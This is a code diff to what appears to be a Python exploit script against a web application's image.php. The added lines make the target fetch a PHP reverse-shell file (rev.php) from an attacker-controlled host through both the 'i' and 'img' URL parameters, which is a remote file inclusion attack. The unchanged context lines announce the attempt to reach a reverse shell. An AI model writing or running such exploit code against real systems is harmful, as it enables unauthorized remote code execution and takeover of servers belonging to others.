@@ -69,6 +69,8 @@ print("Attempting to reach reverse shell on", attackerip, "on port", httpport)
 httpportstr = str(httpport)
 
 def ACTIVATE_HAXOR():
+    # Default config uses $_GET['i'] but orignal finding uses $_GET['img'] lets try both?
+    getrequest_i = requests.get(url + '/image.php?i=http://'+ attackerip +':'+ httpportstr +'/rev.php', verify=False)
     getrequest = requests.get(url + '/image.php?img=http://'+ attackerip +':'+ httpportstr +'/rev.php', verify=False)
 thread2 = threading.Thread(target=ACTIVATE_HAXOR)
 thread2.daemon = False
